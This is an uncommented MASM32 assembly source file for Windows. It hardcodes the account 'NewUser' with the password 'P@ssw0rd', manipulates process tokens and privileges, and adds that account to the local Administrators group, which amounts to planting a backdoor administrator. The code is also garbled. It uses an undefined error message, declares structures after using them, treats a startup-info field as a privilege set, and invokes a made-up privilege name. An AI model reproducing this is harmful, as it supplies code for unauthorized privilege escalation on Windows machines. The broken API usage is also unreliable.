.386
.model flat, stdcall
option casemap:none

include \masm32\include\windows.inc
include \masm32\include\user32.inc
include \masm32\include\advapi32.inc
include \masm32\include\kernel32.inc
include \masm32\include\winnt.inc
include \masm32\include\processthreadsapi.inc

includelib \masm32\lib\kernel32.lib
includelib \masm32\lib\user32.lib
includelib \masm32\lib\advapi32.lib

GetModuleHandle PROTO :DWORD
GetProcAddress PROTO :DWORD, :DWORD

.data
username db "NewUser", 0
password db "P@ssw0rd", 0
admins db "Administrators", 0
logonFlags dd LOGON_NETCREDENTIALS_ONLY
PRIVILEGE_SET struct
  PrivilegeCount DWORD ?
  Control DWORD ?
  Privileges LUID_AND_ATTRIBUTES <>
PRIVILEGE_SET ends
LUID_AND_ATTRIBUTES struct
  Luid LUID <>
  Attributes DWORD ?
LUID_AND_ATTRIBUTES ends

STARTUPINFOEX struc
  StartupInfo STARTUPINFO <>
  lpAttributeList dd ?
STARTUPINFOEX ends

startupInfo STARTUPINFOEX <>

processInfo PROCESS_INFORMATION <>
lpEnvironment DWORD ?
hToken HANDLE ?
pCreateProcessWithLogonW dd ?
attributeListSize DWORD ?
SE_GROUP_ENABLED_NAME db "SeGroupEnabled", 0

.code
start:
invoke GetModuleHandle, NULL
invoke GetProcAddress, eax, addr CreateProcessWithLogonW
mov pCreateProcessWithLogonW, eax
invoke CreateProcessWithLogonW, addr username, NULL, addr password, logonFlags, NULL, NULL, CREATE_DEFAULT_ERROR_MODE, NULL, NULL, addr startupInfo.StartupInfo, addr processInfo
invoke OpenProcessToken, processInfo.hProcess, TOKEN_ALL_ACCESS, addr hToken
invoke LookupPrivilegeValueA, NULL, addr SE_GROUP_ENABLED_NAME, addr startupInfo.lpAttributeList.Attributes[0].Luid
mov startupInfo.lpAttributeList.PrivilegeCount, 1
mov startupInfo.lpAttributeList.Attributes[0], SE_PRIVILEGE_ENABLED
invoke AdjustTokenPrivileges, hToken, FALSE, addr startupInfo.lpAttributeList, NULL, NULL
invoke LookupAccountNameW, NULL, addr username, NULL, NULL, NULL, addr logonFlags
.IF GetLastError() != ERROR_INSUFFICIENT_BUFFER
jmp error
.ENDIF
invoke HeapAlloc, GetProcessHeap(), HEAP_ZERO_MEMORY, logonFlags
mov lpEnvironment, eax
invoke LookupAccountNameW, NULL, addr username, lpEnvironment, addr logonFlags, NULL, addr logonFlags
.IF GetLastError() != ERROR_SUCCESS
jmp error
.ENDIF
invoke CreateEnvironmentBlock, addr lpEnvironment, hToken, FALSE
mov attributeListSize, sizeof(PROC_THREAD_ATTRIBUTE_LIST)
invoke InitializeProcThreadAttributeList, addr startupInfo.lpAttributeList, 1, 0, addr attributeListSize
mov startupInfo.StartupInfo.cb, sizeof STARTUPINFOEX
invoke CreateProcessWithTokenW, hToken, LOGON_WITH_PROFILE, NULL, NULL, 0, NULL, NULL, addr startupInfo.StartupInfo, addr processInfo
invoke DeleteProcThreadAttributeList, addr startupInfo.lpAttributeList
invoke OpenProcessToken, processInfo.hProcess, TOKEN_ALL_ACCESS, addr hToken
invoke LookupPrivilegeValueA, NULL, addr SE_GROUP_ENABLED_NAME, addr startupInfo.lpAttributeList.Privileges[0].Luid
mov startupInfo.lpAttributeList.PrivilegeCount, 1
mov startupInfo.lpAttributeList.Attributes[0], SE_PRIVILEGE_ENABLED
invoke AdjustTokenPrivileges, hToken, FALSE, addr startupInfo.lpAttributeList, NULL, NULL

invoke NetLocalGroupAddMembers, NULL, addr admins, 3, addr username, 1
invoke DestroyEnvironmentBlock, lpEnvironment
invoke CloseHandle, hToken
invoke CloseHandle, processInfo.hProcess
invoke CloseHandle, processInfo.hThread
ret

error:
invoke MessageBox, NULL, addr errorMessage, NULL, MB_OK
ret
end start